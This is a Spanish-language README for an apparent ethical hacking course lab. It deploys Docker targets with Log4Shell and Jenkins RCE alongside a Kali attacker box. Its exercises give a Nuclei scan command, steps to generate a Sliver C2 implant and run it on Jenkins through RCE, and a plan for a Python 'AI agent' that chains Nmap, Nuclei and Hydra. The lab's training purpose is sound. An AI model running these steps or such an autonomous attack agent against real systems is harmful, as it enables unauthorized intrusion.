# 🤖 Unidad 5: Pentesting Autónomo y Red Teaming - LAB PRÁCTICO

## 📋 Arquitectura
- **Target 1 (Log4Shell)**: Puerto 8080. Vulnerabilidad crítica moderna para probar detección automatizada.
- **Target 2 (Jenkins RCE)**: Puerto 8081. Ejecución remota de comandos clásica.
- **Kali Linux (C2 & AI)**: Equipado con Sliver C2, Nuclei y Metasploit.

## 🚀 Ejercicios Sugeridos

### 1. Escaneo Autónomo con Nuclei
Desde Kali, usa Nuclei para detectar Log4Shell automáticamente:
```bash
nuclei -u http://172.18.5.10:8080 -t cves/2021/CVE-2021-44228.yaml
```

### 2. Despliegue de Agente C2 (Sliver)
1. Inicia el servidor Sliver: `sliver`
2. Genera un implante Linux: `generate --mtls 172.18.5.20 --os linux`
3. Sube el implante al Jenkins vulnerable (vía RCE) y ejecútalo.

### 3. Simulación de Agente IA
Crea un script en Python que use `subprocess` para:
1. Correr Nmap contra la red.
2. Analizar el output (puertos abiertos).
3. Decidir si lanzar Nuclei (si puerto 8080) o Hydra (si puerto 22).

## 🛑 Limpieza

### Opción 1: Usar scripts de automatización (Recomendado)

```bash
cd /ruta/a/tu/directorio/Ethical_Hacking/docker-labs/lab5

# Iniciar el lab
./setup.sh

# Verificar estado
./check-lab.sh

# Resetear el lab (eliminar todo)
./reset.sh
```

### Opción 2: Manual con Docker Compose

`docker-compose down -v`
